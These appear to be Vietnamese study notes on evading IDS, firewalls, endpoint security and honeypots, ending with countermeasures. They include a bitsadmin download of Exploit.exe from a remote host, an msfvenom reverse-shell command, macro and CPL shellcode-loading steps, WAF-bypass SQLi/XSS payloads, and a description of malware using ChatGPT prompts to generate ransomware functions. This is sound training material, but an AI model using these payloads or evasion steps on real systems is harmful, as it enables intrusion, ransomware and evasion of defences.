...
**Các dấu hiệu xâm nhập chung (General Indications of Intrusions) [Trang 1631 - 1632]:**
Các nỗ lực xâm nhập vào mạng hoặc hệ thống tệp có thể được xác định thông qua các dấu hiệu sau:

- **Xâm nhập hệ thống tệp (File System Intrusions):**
  - Xuất hiện các tệp/chương trình mới, không xác định trên hệ thống.
  - Sửa đổi không thể giải thích được về kích thước tệp, quyền sở hữu và quyền truy cập (ví dụ từ read-only sang write).
  - Sự hiện diện của các tệp suid và sgid giả mạo trên Linux.
  - Tên tệp lạ trong thư mục, bao gồm tệp thực thi có phần mở rộng kép hoặc tệp bị thiếu.
  - Mức sử dụng dung lượng đĩa tăng đột biến hoặc cạn kiệt lưu lượng lưu trữ bất ngờ.
  - Hệ thống hoạt động bất thường (hiệu suất chậm, crash tệp thường xuyên).
- **Xâm nhập mạng (Network Intrusions):**
  - Tăng đột ngột mức tiêu thụ băng thông.
  - Các cuộc thăm dò (probes) lặp đi lặp lại vào các dịch vụ trên máy.
  - Yêu cầu kết nối từ các IP nằm ngoài dải mạng, hoặc nỗ lực đăng nhập liên tục từ host từ xa.
  - Lượng lớn dữ liệu log tràn vào đột ngột (dấu hiệu của DoS/DDoS).
  - Thay đổi bất ngờ trong cấu hình mạng hoặc quy tắc tường lửa.
  - Crash hệ thống do quá tải mạng, hoặc lưu lượng outbound kết nối tới các tên miền độc hại.
- **Xâm nhập hệ thống (System Intrusions):**
  - Thay đổi đột ngột trong nhật ký (ví dụ: log bị ngắn lại hoặc không đầy đủ), hoặc thiếu log.
  - Thông báo văn bản hoặc hiển thị đồ họa bất thường.
  - Lỗ hổng trong kế toán hệ thống (Gaps in system accounting).
  - Xuất hiện các tiến trình (processes) lạ, cảnh báo từ IDS/Antivirus, hoặc có cài đặt phần mềm trái phép.
  - Sự hiện diện của các dấu vết như tệp shell history, tệp tạm thời hoặc tàn dư của công cụ tấn công.
...
- **Demilitarized zone (Vùng phi quân sự - DMZ)** [Trang 1639 - 1640]:
  - Là một mạng con (sub-network) nhỏ đặt ở vùng trung lập giữa mạng nội bộ an toàn của công ty và mạng ngoài không tin cậy (Internet).
    ...
    * _Lưu ý về DMZ (Vùng phi quân sự):_ Ưu điểm của việc thiết lập một mạng con (subnet) cách ly khỏi mạng Intranet là các yêu cầu công khai (public requests) có thể được phản hồi mà không cho phép lưu lượng truy cập đi sâu vào mạng nội bộ. Tuy nhiên, nhược điểm của tường lửa 3 giao diện (three-homed firewall) là nếu nó bị xâm nhập, cả DMZ và mạng Intranet đều có thể bị xâm phạm. Kỹ thuật an toàn hơn là sử dụng **nhiều tường lửa (multiple firewalls)** để tách Internet khỏi DMZ, và sau đó tiếp tục tách DMZ khỏi mạng Intranet.
...
- **Network address translation (NAT)** [Trang 1648 - 1649]: Chuyển đổi địa chỉ IP nội bộ sang IP công cộng (và ngược lại) để ẩn sơ đồ mạng nội bộ, ép lưu lượng qua một điểm nút thắt (choke point). Hệ thống NAT sử dụng các lược đồ khác nhau để dịch giữa địa chỉ nội bộ và bên ngoài:
  - Gán một địa chỉ host ngoại vi (external host address) cố định cho mỗi địa chỉ nội bộ và luôn áp dụng cùng một bản dịch. (Không tiết kiệm được không gian địa chỉ IP).
  - Cấp phát động (Dynamically allocate) một địa chỉ host ngoại vi mà không sửa đổi số cổng khi host nội bộ khởi tạo kết nối.
  - Tạo ánh xạ cố định (fixed mapping) nhưng sử dụng Port mapping để nhiều máy nội bộ dùng chung một địa chỉ ngoại vi.
  - Cấp phát động một cặp địa chỉ host ngoại vi và cổng (IP & Port pair) mỗi khi host nội bộ khởi tạo kết nối (giúp sử dụng hiệu quả nhất các địa chỉ host ngoại vi).
...
_Ví dụ một quy tắc YARA (Trang 1654):_
...
- **Snort** [Trang 1657 - 1660]: Hệ thống IDS mạng mã nguồn mở, thực hiện phân tích lưu lượng thời gian thực và ghi log gói tin trên mạng IP. Có khả năng phân tích giao thức và tìm kiếm/so khớp nội dung để phát hiện buffer overflows, stealth port scans và OS fingerprinting.
  ...
  - **Rule Actions (Hành động của quy tắc):** Mục hành động cho Snort biết "phải làm gì" khi tìm thấy gói tin khớp với tiêu chí. Có 6 hành động mặc định: `alert`, `log`, `pass`, `drop`, `reject`, và `sdrop`.
  - **IP Protocols (Giao thức IP):** Snort hỗ trợ theo dõi 3 giao thức IP chính là TCP, UDP và ICMP.
  - **Cú pháp nâng cao trong Quy tắc Snort:**
    - **Toán tử hướng (Direction Operator):** Cho biết hướng của lưu lượng. Sử dụng `->` (đơn hướng) hoặc `<>` (hai chiều/bidirectional). _Lưu ý: Không có toán tử `<-`._
    - **Khai báo danh sách IP (IP Address Lists):** Snort có thể xử lý một IP đơn lẻ hoặc một danh sách các IP. Khi chỉ định danh sách, các IP phải được phân tách bằng dấu phẩy và đặt trong dấu ngoặc vuông (không có khoảng trắng). Ví dụ: `[192.168.1.1,192.168.1.45,10.1.1.24]`.
    - **Phủ định địa chỉ IP và Cổng (Negation):** Snort cho phép dùng toán tử NOT (`!`) với IP hoặc Cổng để áp dụng quy tắc cho mọi thứ _ngoại trừ_ đối tượng đó.
    - _(Ví dụ phủ định IP: `alert tcp !192.168.1.0/24 any -> 192.168.1.0/24 111`)_
    - _(Ví dụ phủ định Port: `log tcp any -> 192.168.1.0/24 !6000:6010`)_
...
- **Firewalking:** Kỹ thuật dùng giá trị TTL (Time-to-Live) để xác định các bộ lọc ACL trên gateway và lập bản đồ mạng (hoạt động tương tự traceroute). Kẻ tấn công gửi gói TCP/UDP với giá trị TTL lớn hơn 1 hop so với tường lửa mục tiêu để xem phản hồi ICMP error. Công cụ: Script `firewalk` của Nmap.
  - **Chi tiết kỹ thuật Firewalking:** Firewalking hoạt động bằng cách gửi các gói TCP/UDP vào tường lửa với giá trị TTL (Time-To-Live) lớn hơn chính xác 1 hop so với tường lửa mục tiêu. Nếu gói tin lọt qua được cổng (gateway), hệ thống sẽ chuyển tiếp nó sang hop tiếp theo (nơi TTL giảm về 0), từ đó kích hoạt một thông báo lỗi ICMP "TTL exceeded in transit" dội ngược về. Nếu không có phản hồi ICMP, nghĩa là tường lửa đã drop gói tin đó. Điều này giúp kẻ tấn công xác định chính xác các rule cổng đang mở.
...
### Using an IP Address in Place of a URL (Sử dụng địa chỉ IP thay vì URL) [Trang 1675]

- Phương pháp này liên quan đến việc nhập trực tiếp địa chỉ IP của trang web bị chặn vào thanh địa chỉ của trình duyệt thay vì nhập tên miền. Ví dụ: gõ IP của Facebook thay vì facebook.com.
- Có thể sử dụng các dịch vụ như Host2ip để tìm địa chỉ IP của trang web bị chặn.
- Phương pháp này sẽ thất bại nếu phần mềm chặn có tính năng theo dõi luôn cả địa chỉ IP được gửi đến web server.

### Bypassing IDS/Firewall bằng các trang lướt web ẩn danh (Using Anonymous Website Surfing Sites) [Trang 1676]

- Các trang web lướt web ẩn danh giúp duyệt Internet ẩn danh và truy cập các trang bị chặn mà không tiết lộ địa chỉ IP thật của người dùng.
- Một số trang cung cấp tùy chọn mã hóa cả URL.
- Các proxy này sẽ ẩn IP thực và hiển thị một IP khác, cho phép vượt qua rào cản từ tường lửa.
- Anonymize VPN (https://anonymize.com): Định tuyến toàn bộ lưu lượng qua một đường hầm mã hóa trực tiếp từ máy tính để bảo mật mạng, mask (che giấu) IP thực để đảm bảo ẩn danh hoàn toàn.
- Một số công cụ/trang web ẩn danh trực tuyến: https://anonymize.com, https://2ip.io/anonim, https://www.kproxy.com, https://zendproxy.com, https://proxify.com, https://www.proxysite.com, http://anonymouse.org, https://proxyscrape.com.
...
- Công cụ: `chisel`, HTTPort, HTTHost, Tunna. HTTPort hỗ trợ cấu hình SSL/CONNECT mode hoặc chạy qua một remote host bảo mật bên ngoài để mã hóa toàn bộ dữ liệu.
  - **Cơ chế của HTTPort:** HTTPort cung cấp hai chế độ chạy hầm: **SSL/CONNECT mode** và **Remote host mode**.
    - **SSL/CONNECT mode:** Chế độ này yêu cầu proxy phải hỗ trợ phương thức HTTP CONNECT (thường bị vô hiệu hóa mặc định). Chế độ này rất nhanh nhưng dữ liệu không được mã hóa, do đó proxy có thể theo dõi mọi hành động.
    - **Remote host mode:** Sử dụng một máy chủ đặc biệt có tên là **HTTHost** cài đặt bên ngoài mạng bị chặn. Proxy sẽ thấy người dùng như đang lướt một trang web bình thường, nhưng thực tế HTTHost đang thực hiện một nửa quá trình tạo hầm và giao tiếp với máy chủ đích. Chế độ này chậm hơn nhưng mã hóa dữ liệu cực mạnh, khiến việc ghi log của proxy trở nên vô dụng.
  - **Các bước cấu hình HTTPort và HTTHost:**
    1. Vô hiệu hóa _IIS Admin Service_ và _World Wide Web Publishing Service_ trên hệ thống của kẻ tấn công.
    2. Chạy HTTHost với cài đặt mặc định, nhập mật khẩu và chọn _Revalidate DNS names_ & _Log connections_.
    3. Bật Windows Defender Firewall và tạo Outbound rule để block traffic trên cổng 21 (FTP).
    4. Chạy HTTPort, vào tab Proxy, nhập IP của máy HTTHost (port 90) và mật khẩu.
    5. Trong tab _Port mapping_, thêm mapping mới (ví dụ: Local port 21 map tới Remote host IP đích).
    6. Nhấn Start. Mở CMD và gõ `ftp 127.0.0.1` để đăng nhập. HTTPort sẽ bắt gói FTP này và tunnel nó ra ngoài bất chấp tường lửa đang chặn cổng 21.
...
- Kỹ thuật này được mã độc dùng để duy trì kết nối ẩn với máy chủ Command & Control (C2). Công cụ: `iodine`, `dnscat2`.
  - **Chi tiết công cụ iodine:** Gói công cụ này gồm 2 file thực thi:
    - **iodined (server):** Chạy trên máy chủ có IP public. Nó chịu trách nhiệm giải mã dữ liệu do client gửi đến, truy cập Internet thay mặt client và mã hóa dữ liệu phản hồi nhét ngược vào các gói tin DNS reply.
    - **iodine (client):** Chạy trên máy nạn nhân. Bắt các gói tin outgoing và mã hóa chúng thành các câu truy vấn DNS gửi tới server iodined.
...
- Để vượt qua bộ lọc của Web Application Firewall (WAF), kẻ tấn công biến đổi mã:
  - **Mã ASCII:** Chuyển ký tự sang số (Ví dụ: `String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41)`).
  - **Mã Hex Encoding:** Chuyển thành hệ thập lục phân (Ví dụ: `%3C%73%63%69%72...`).
  - **Bypass Blacklist SQLi:** Khi từ khóa `AND`, `OR`, `UNION` bị cấm, kẻ tấn công có thể dùng toán tử thay thế như: `1 || (select username, pwd from employees where userID = 1001) = 'admin'`.
...
- `bitsadmin` có thể tạo job để chuyển file (bị lạm dụng để truyền file độc hại) và tạo persistence _(Ví dụ: `/SetNotifyCmdLine persistence <Local Path> NULL` sẽ kích hoạt thực thi malware ngay khi tải xong)_.
  - **Các lệnh BITSAdmin thực tế:**
    ```cmd
    bitsadmin /transfer Exploit http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
    ```
    _Thiết lập Persistence (Kiên trì):_
    ```cmd
    /create persistence
...
- **Fragmentation attack (Tấn công phân mảnh)** [Trang 1714 - 1716]: Khai thác giới hạn kích thước MTU. Nếu MTU bị vượt, gói tin sẽ bị phân mảnh. Kẻ tấn công lợi dụng sự chênh lệch thời gian chờ ghép nối (reassembly timeout) giữa IDS và máy đích (Ví dụ: IDS timeout 10s, máy đích 20s) để đẩy các mảnh vỡ qua IDS mà không bị phát hiện.
  - **Kịch bản 1 (NIDS timeout < Victim timeout):** VD NIDS timeout là 10s, Victim là 20s. Kẻ tấn công gửi Mảnh 1, chờ 15s rồi mới gửi Mảnh 2. NIDS sẽ drop Mảnh 1 vì quá 10s chưa nhận đủ để ghép, trong khi Victim (20s) vẫn giữ Mảnh 1 và ghép thành công với Mảnh 2.
  - **Kịch bản 2 (NIDS timeout > Victim timeout):** VD NIDS timeout là 60s, Victim là 30s. Kẻ tấn công gửi 4 mảnh. Đầu tiên gửi Mảnh 2' và 4' (chứa payload giả). Đợi 30s để Victim tự xóa bỏ các mảnh này do timeout. Lúc này NIDS vẫn lưu Mảnh 2', 4' giả trong RAM. Kẻ tấn công tiếp tục gửi Mảnh 1, 3, 2, 4 (payload thật). Victim nhận đủ 1-2-3-4 sạch và ghép lại. NIDS cố ghép Mảnh 1, 3 với Mảnh 2', 4' giả ban đầu nên Checksum báo lỗi và NIDS bỏ qua traffic này.
...
- **Urgent (URG) flag** [Trang 1717 - 1718]: Trong TCP, cờ URG dùng con trỏ để đánh dấu dữ liệu khẩn cấp. Một số IDS đọc toàn bộ dữ liệu, nhưng hệ thống đích lại bỏ qua phần dữ liệu rác nằm trước con trỏ URG, dẫn đến sự bất đồng bộ giữa IDS và máy đích.
  - **Chi tiết tính năng Urgency Flag - URG:** Theo chuẩn RFC 1122, nếu một TCP segment có chứa con trỏ URG, thì chính xác 1 byte dữ liệu nằm ngay sau dữ liệu khẩn cấp (urgent data) sẽ bị hệ thống đích bỏ qua (lost/dropped). Bằng cách chèn 1 byte rác vào vị trí này, NIDS sẽ đọc toàn bộ chuỗi (kể cả byte rác), trong khi hệ thống đích tự động vứt byte rác đi. Kết quả là hai bên nhận được 2 chuỗi khác nhau. (VD: Gửi XYZ, LMN [URG:3], PQR. Điểm cuối sẽ đọc là XYZLMNQR - chữ P bị mất).
...
- **Desynchronization (Mất đồng bộ)** [Trang 1720]:
  - **Pre-Connection SYN:** Gửi một gói SYN khởi tạo với checksum TCP không hợp lệ trước khi kết nối thật được thiết lập. IDS đọc và reset số sequence theo gói SYN giả này (hoặc bỏ qua checksum), khiến nó bị mất đồng bộ với máy đích (nơi loại bỏ gói tin vì sai checksum).
  - **Post-Connection SYN:** Gửi một gói SYN sau khi kết nối đã được thiết lập với số sequence khác biệt. Host đích sẽ bỏ qua vì kết nối đã có sẵn, nhưng IDS có thể cố gắng đồng bộ lại số sequence theo gói SYN mới này, khiến nó bỏ qua các luồng dữ liệu tấn công thực sự đi sau.
...
- **Dechaining macros** [Trang 1731 - 1734]: Viết các script VBA (VBScript) tinh vi để thoát khỏi quy trình Office, né tránh phát hiện điểm cuối. Các phương thức:
  ...
  - Sử dụng `WmiPrvse.exe`, Registry Modification, tạo Scheduled Tasks, hoặc tính năng vba-exe của Metasploit.
    - **Spawning through ShellCOM (Gọi tiến trình qua ShellCOM):**
      ```vbscript
      Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
      obj.Document.Application.ShellExecute "calc.exe",Null,"C:\\Windows\\System32",Null,0
      ```
    - **Spawning using XMLDOM (Gọi tiến trình qua XMLDOM):**
      ```vbscript
    ...
    - **Dropping Files (Thả tệp vào thư mục Startup):**
      ...
      objFile.Close
      ```
    - **Creating Scheduled Tasks (Tạo tác vụ theo lịch trình):**
      ```vbscript
      ...
      ```
    - **Downloading Content (Tải nội dung):**
      ```vbscript
      ...
      End With
      ```
    - **Embed File and Drop (Dùng tính năng vba-exe của Metasploit):**
      ```bash
...
- **Process injection** [Trang 1738 - 1739]: Chèn mã độc vào không gian bộ nhớ của một tiến trình hợp pháp đang chạy. Thường sử dụng các Windows API như:
  - **VirtualAllocEx():** Hàm này phân bổ bộ nhớ trong không gian địa chỉ của tiến trình đích. Kẻ tấn công gọi nó để giữ chỗ (reserve) một khối bộ nhớ nhằm chứa payload.
  - **WriteProcessMemory():** Hàm dùng để ghi dữ liệu vào không gian bộ nhớ của tiến trình từ xa. Kẻ tấn công dùng nó để ghi mã độc vào vùng nhớ đã phân bổ ở bước trên.
  - **CreateRemoteThread():** Hàm tạo một luồng (thread) mới trong không gian địa chỉ của tiến trình đích. Nó được dùng để kích hoạt luồng chạy và thực thi mã độc đã được tiêm vào.
...
- **CPL side-loading** [Trang 1742 - 1744]: Giả mạo applet của Control Panel (file `.cpl`). Đóng gói shellcode bằng Base64 và nhúng vào file CPL để qua mặt AV. Công cụ: `CPLResourceRunner`.
  - **Cấu trúc mã C cho file .cpl:**
    ...
    ```
  - **Các bước tạo CPL độc hại bằng CPLResourceRunner:**
    1. Dùng Cobalt Strike tạo payload dạng x86 (lưu thành beacon.bin).
    2. Chạy `ConvertShellcode.py` trên beacon.bin để tạo `shellcode.txt`.
    3. Dùng lệnh Linux chuyển chuỗi shellcode sang định dạng Base64 và chuẩn bị cho file resource: `cat shellcode.txt |sed 's/[, ]//g; s/0x//g;' |tr -d '\n' |xxd -p -r |gzip -c |base64 > b64shellcode.txt`.
    4. Copy nội dung Base64 vào file `Resources.txt` trong cùng thư mục dự án.
    5. Gom tài nguyên dưới dạng x86 và copy `CPLResourceRunner.dll` thành một tệp mới có tên `maliciousnew.cpl`.
- **Sử dụng AI/ChatGPT** [Trang 1745 - 1749]: Dùng ChatGPT để liên tục thay đổi mã (mutate) tạo ra phần mềm độc hại đa hình (polymorphic), viết script tự động hóa trích xuất và mã hóa tệp tin, né tránh API theo dõi.
  - _(Quy trình tấn công bằng ChatGPT cụ thể)_: Kẻ tấn công tích hợp API của ChatGPT trực tiếp vào malware có chứa trình thông dịch Python. Quá trình gồm 3 bước:
    1. **Obtaining the code (Lấy mã):** Hỏi ChatGPT để sinh ra mã hàm tìm kiếm các tệp mục tiêu và sinh mã tiện ích mã hóa tệp tin.
       - Ví dụ câu lệnh (Prompt) yêu cầu ChatGPT tạo mã Python:
         - Lệnh tìm kiếm file: "Please write me a function named 'FindTheseFiles' in Python that searches all the files that end up with "txt, pdf, docx, ppt, xlsm, xlsx, png, jpg, jpeg, pptx", starting from root directory. Returns a list of all paths of the files that match the criteria. Include the relevant imports. Only provide the code without explanation."
         - Lệnh mã hóa file: "Please write me a function 'EncryptGivenFile' that receives an encryption key and a path to the file and encrypts it in Python. Include the relevant imports. Only provide the code without explanation."
    2. **Validation (Xác thực):** Máy chủ C2 ra lệnh cho malware mã hóa một tệp thử nghiệm bằng key cụ thể. Tệp mã hóa được gửi lại C2 để thử giải mã. Nếu thành công, mã được phê duyệt.
    3. **Execution (Thực thi):** Malware sử dụng các hàm Python tích hợp như `compile()`, `exec()`, `eval()` để chạy mã độc tàng hình trên các nền tảng khác nhau mà không để lại mẫu chữ ký tĩnh.
- **Sử dụng mẫu Metasploit (Metasploit Templates)** [Trang 1750 - 1752]:
  1. Xuất payload bằng lệnh: `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=444 -f exe > /home/attacker/Windows.exe`.
  2. Mở file mã nguồn `template.c` của Metasploit, giảm kích thước payload (ví dụ từ 4096 xuống 4000) và thêm mảng rác để làm rối:
  ...
  3. Biên dịch lại template mới bằng trình biên dịch mingw: `i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe`.
  4. Tạo lại payload mới áp dụng template vừa biên dịch: `msfvenom -p ... -x /đường_dẫn_tới/evasion.exe -f exe > bypass.exe`.
...
**Các kỹ thuật Bypass Endpoint khác** [Trang 1756 - 1759]:

- **Hosting Phishing Sites on Popular Infrastructure:** Đặt các trang web lừa đảo trên hạ tầng đám mây uy tín (như Google Cloud và AWS) vì các giải pháp EDR thường không đưa các IP của hạ tầng này vào danh sách đen (blacklist). Kẻ tấn công cũng có thể phân phối mã độc bằng cách ẩn giấu trong ảnh/multimedia trên mạng xã hội bằng kỹ thuật steganography.
- **Passing Encoded Commands:** Kẻ tấn công truyền các lệnh đã mã hóa (ví dụ: Base64 hoặc định dạng Hex) để che giấu các tham số và mã khỏi cơ chế phát hiện. Ví dụ: mã hóa chuỗi lệnh Invoke-WebRequest bằng Base64 để vượt qua kiểm duyệt.
  ```powershell
  ...
  echo $encodedCommand
  ```
- **Timing-based evasion:** Kỹ thuật né tránh hộp cát (sandbox evasion) bằng cách thiết lập mã độc chỉ thực thi vào một thời điểm cụ cụ thể hoặc sau các thao tác nhất định của nạn nhân (như click chuột hoặc khởi động lại hệ thống). Các ví dụ gồm: sleep patching, delay APIs, và time bombs.
- **Signed Binary Proxy Execution:** Lợi dụng các tiện ích hệ thống hợp pháp, được tích hợp sẵn và có chữ ký số (ví dụ: rundll32.exe) để thực thi hoặc làm proxy chạy mã độc nhằm né tránh các giải pháp EDR.
- **Shellcode Encryption:** Mã hóa các lệnh chứa payload độc hại bằng các thuật toán như XOR, RC4, AES và tự động giải mã chúng trực tiếp trên bộ nhớ khi thực thi.
- **Reducing Entropy:** Giảm độ hỗn loạn (entropy) của tệp nhị phân để làm chúng trông ít đáng ngờ hơn, ví dụ như chèn thêm các hình ảnh có entropy thấp hoặc các chuỗi mã hệ thống hợp lệ (như chrome.dll).
- **Escaping the (Local) AV Sandbox:** EDR thường chỉ đưa file vào sandbox mô phỏng trong vài giây. Kẻ tấn công khai thác hạn chế này bằng cách trì hoãn việc thực thi shellcode (ví dụ: bắt hệ thống tính toán các số nguyên tố siêu lớn) để làm cạn kiệt thời gian quét của hộp cát.
- **Disabling Event Tracing for Windows (ETW):** Vô hiệu hóa chức năng ghi log hệ thống của EDR bằng cách can thiệp vào tiến trình ntdll.dll và vá (patch) hàm EtwEventWrite để nó luôn trả về giá trị 0 (SUCCESS) mà không thực hiện ghi log.
- **Direct System Calls and Evading "Mark of the Syscall":** Lách qua các hàm API bị hệ thống bảo mật hook (theo dõi) bằng cách gọi trực tiếp các lời gọi hệ thống (system calls) từ kernel, hoặc trích xuất ID của syscall từ ntdll.dll và đẩy trực tiếp vào ngăn xếp (stack) để gọi bằng lệnh assembly.
- **Spoofing the Thread Call Stack:** Khi phần mềm gián điệp ở trạng thái chờ lệnh (dormant/beaconing), kẻ tấn công đánh chặn hàm Sleep(), ghi đè địa chỉ trả về (return address) thành 0x0, sau đó mới gọi hàm Sleep() gốc để EDR không thể dò quét ra shellcode trong bộ nhớ.
- **In-memory Encryption of Beacon:** Tự động mã hóa vùng nhớ chứa phần mềm gián điệp (bằng hàm XOR) mỗi khi nó chuyển sang trạng thái ngủ (Sleep), và tự động giải mã lại khi nó thức dậy để tiếp tục thực thi, giúp qua mặt các trình quét bộ nhớ (memory scanners).
...
- **Phân tích thời gian phản hồi (Analyzing Response Time):** Honeypots thường có độ trễ cao hoặc không nhất quán do phải xử lý thêm các lớp ghi log và giám sát. Đo lường bằng Ping, Traceroute hoặc lệnh Nmap (`nmap -p 80 --scan-delay 1s --max-retries 5 target_ip`).
  - _Ví dụ lệnh kiểm tra độ trễ bằng Nmap:_ `nmap -p 80 --scan-delay 1s --max-retries 5 <target_ip>`.
...
- **Send-Safe Honeypot Hunter** [Trang 1775]:
  ...
  - **SniffingBear:** Một công cụ khác được kẻ tấn công sử dụng để rà quét và phát hiện honeypot trong mạng lưới đích của tổ chức.

## 19. Các biện pháp phòng chống (Countermeasures) [Trang 1777 - 1785]

### 19.1 Phòng chống Evasion đối với IDS (Defend Against IDS Evasion)

- Tắt các port switch được liên kết với các máy chủ tấn công đã biết.
- Thực hiện phân tích chuyên sâu các lưu lượng mạng không rõ ràng/mơ hồ.
- Sử dụng gói TCP FIN hoặc Reset (RST) để ngắt các phiên TCP độc hại.
- Tìm kiếm mã `nop` opcode khác giá trị `0x90` để phòng thủ trước polymorphic shellcode.
- Triển khai bộ chuẩn hóa lưu lượng (traffic normalizer) tại IDS để loại bỏ sự mơ hồ từ luồng gói tin trước khi nó đến IDS. Đảm bảo IDS chuẩn hóa các gói tin phân mảnh và reassemble chúng theo đúng thứ tự.
- Chỉ định máy chủ DNS rõ ràng cho các client resolver.
- Harden (củng cố) bảo mật của mọi thiết bị như modem và router.
- Tại interface kết nối ra ngoài, chặn các gói ICMP hết hạn TTL và đổi trường TTL thành một giá trị lớn để đảm bảo host đích luôn nhận được gói tin (ngăn chặn TTL evasion).
- Đảm bảo các quy tắc Snort được cấu hình chính xác để tránh cảnh báo giả (false positives). Kiểm tra thư mục quy tắc để tìm các script độc hại được chèn lén.
- Cấu hình IDS để phát hiện các kỹ thuật tunneling, obfuscation, overlapping fragments, và xử lý được các phiên bị phân mảnh (reassembling fragmented sessions).

### 19.2 Phòng chống Evasion đối với Firewall (Defend Against Firewall Evasion)

- Cấu hình Firewall để lọc/loại bỏ địa chỉ IP của kẻ xâm nhập.
- Mặc định chặn tất cả lưu lượng và chỉ bật các dịch vụ thực sự cần thiết (Default Deny).
- Tạo một User ID độc nhất để chạy các dịch vụ firewall thay vì dùng quyền root/admin.
- Cấu hình máy chủ Syslog từ xa và áp dụng biện pháp bảo vệ nghiêm ngặt để chống kẻ tấn công xóa log.
- Theo dõi và điều tra các bản log một cách định kỳ. Vô hiệu hóa kết nối FTP theo mặc định.
- Sử dụng các hệ thống truy vấn rủi ro (risk queries) thường xuyên để tìm quy tắc tường lửa yếu.
- Giám sát kỹ quyền của user nào được phép thay đổi cấu hình tường lửa. Thông báo ngay cho Security Admin nếu có thay đổi cấu hình và ghi tài liệu lại.
- Kiểm soát quyền truy cập vật lý (physical access) vào thiết bị tường lửa. Backup ruleset thường xuyên.
- Sử dụng công cụ HTTP Evader để test tự động các thủ thuật né tránh tường lửa.
- Triển khai tích hợp thanh tra HTTPS/TLS (HTTPS/TLS inspection) và Deep Packet Inspection ở lớp ứng dụng (Application Layer).

### 19.3 Phòng chống Evasion đối với Endpoint Security và NAC

**Bảo vệ Endpoint Security:**

- Sử dụng Antivirus có công nghệ phát hiện hành vi, Machine Learning và Threat Intelligence. Cập nhật OS và App liên tục.
- Phân đoạn mạng (Network segmentation) để ngăn chặn mã độc lây lan ngang (lateral movement).
- Áp dụng nguyên tắc Đặc quyền tối thiểu (Least privileges) và bật Xác thực đa yếu tố (MFA).
- Sử dụng Application Whitelisting và Code Signing Certificates để đảm bảo chỉ phần mềm sạch được chạy.
- Sử dụng lọc địa chỉ MAC. Triển khai công cụ FIM (File Integrity Monitoring) và DLP (Data Loss Prevention).
- Sử dụng các cơ chế bảo vệ vùng nhớ: ASLR (Address Space Layout Randomization), DEP (Data Execution Prevention) và CFI (Control Flow Integrity).
- Giới hạn cổng USB và truyền dữ liệu qua removable media/email.

**Bảo vệ NAC (Network Access Control):**

- Phân loại thiết bị (Device profiling) để nhận diện các thiết bị có hành vi bất thường khi cố gắng kết nối.
- Đảm bảo chính sách NAC được thực thi động (dynamic enforcement) theo thời gian thực.
- Áp dụng RBAC (Role-Based Access Control) và mô hình Zero-Trust (mọi thiết bị phải được xác minh ở mỗi điểm truy cập).
- Chia nhỏ tài nguyên nhạy cảm và giới hạn bằng mạng VLAN.
- Tích hợp giải pháp NAC với hệ thống SIEM để tương quan cảnh báo (correlate alerts) giữa NAC, Tường lửa, IDS/IPS.
- Sử dụng xác thực nâng cao (Certificate-based hoặc Biometric). Chủ động săn lùng mối đe dọa (Threat hunting).

### 19.4 Phòng chống Evasion đối với Anti-Virus

- Chuyển từ Antivirus truyền thống sang các giải pháp EPP (Endpoint Protection) và EDR.
- Chạy và kiểm thử các tệp đáng ngờ trong môi trường Sandbox cô lập.
- Kết hợp nhiều lớp bảo mật (Defense-in-depth) như Firewall, IDS, IPS.
- Sử dụng các phương pháp phát hiện không cần chữ ký (Signature-less detection/AI) để bỏ qua sự phụ thuộc vào database chữ ký tĩnh.
- Hạn chế tối đa quyền Admin của người dùng để chặn tiến trình cài đặt mã độc. Dùng VPN cho các truy cập từ xa.
